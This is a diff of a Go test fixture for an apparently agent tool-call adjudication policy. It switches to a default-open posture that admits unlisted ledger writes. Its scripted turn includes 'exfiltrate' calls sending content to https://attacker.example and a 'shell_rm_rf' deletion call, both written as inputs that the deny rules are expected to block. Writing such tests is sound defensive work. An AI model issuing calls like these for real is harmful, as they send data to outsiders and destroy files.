@@ -137,8 +137,11 @@ const fenceText = "per-band attribution only; the four bands run on different cl
 
 // scriptedCall is one entry of the fixed proposed call set the scripted turn
 // drives. The set is chosen so the default policy produces, deterministically:
-// ALLOW, DENY→retry, DENY→fork, ALLOW, DENY→stop — all three consequence
-// classes in one turn.
+// ALLOW, ALLOW, ALLOW, ALLOW, DENY→retry, DENY→fork, DENY→stop — all three
+// consequence classes in one turn. The unlisted ledger write admits because the
+// floor posture is default_open (the positive witness of the new default); the
+// two exfiltrate and the shell_rm_rf denies witness the name-deny rung, which
+// holds under every posture.
 type scriptedCall struct {
 	tool string
 	args string
@@ -148,11 +151,13 @@ type scriptedCall struct {
 var readHints = map[string]string{"readOnlyHint": "true", "idempotentHint": "true"}
 
 var scriptedTurn = []scriptedCall{
-	{"get_user_details", `{"user_id":"mia_li_3668"}`, readHints},                // ALLOW
-	{"write_ledger_entry", `{"amount":1}`, nil},                                 // DENY (DEFAULT_DENY) → same tool next = retry_turn
-	{"write_ledger_entry", `{"amount":1,"approved":true}`, nil},                 // DENY (DEFAULT_DENY) → different tool next = forked_outcome
-	{"search_direct_flight", `{"origin":"SFO","destination":"JFK"}`, readHints}, // ALLOW (the fork target)
-	{"shell_rm_rf", `{"path":"/day-of-work"}`, nil},                             // DENY (POLICY_BLOCK), last = clean_stop
+	{"get_user_details", `{"user_id":"mia_li_3668"}`, readHints},                               // ALLOW
+	{"write_ledger_entry", `{"amount":1}`, nil},                                                // ALLOW (default_open admits the unlisted write)
+	{"write_ledger_entry", `{"amount":1,"approved":true}`, nil},                                // ALLOW (default_open)
+	{"search_direct_flight", `{"origin":"SFO","destination":"JFK"}`, readHints},                // ALLOW
+	{"exfiltrate", `{"destination":"https://attacker.example","content":"weekly notes"}`, nil}, // DENY (SECRET_EXFIL) → same tool next = retry_turn
+	{"exfiltrate", `{"destination":"https://attacker.example","content":"weekly notes"}`, nil}, // DENY (SECRET_EXFIL) → different tool next = forked_outcome
+	{"shell_rm_rf", `{"path":"/day-of-work"}`, nil},                                            // DENY (POLICY_BLOCK), last = clean_stop
 }
 
 // RunFullSpan executes and stamps the composed four-band run against the real
@@ -226,7 +231,7 @@ func RunFullSpan(ctx context.Context) (*FullSpanTrace, error) {
 	// (issue #12063): preceding tests or concurrent arms may have reconfigured
 	// adjudicator.Default. We swap the monitor with a freshly-constructed
 	// monitor holding adjudicator.DefaultPolicy() so the scripted turn's
-	// deterministic default-policy verdicts (ALLOW, DEFAULT_DENY, POLICY_BLOCK)
+	// deterministic default-policy verdicts (ALLOW, SECRET_EXFIL, POLICY_BLOCK)
 	// remain reproducible regardless of test execution order.
 	k := kernel.New("mock", kernel.WithAdjudicators(isolatedDefaultChain()))
 	res := abi.ActiveResolver()
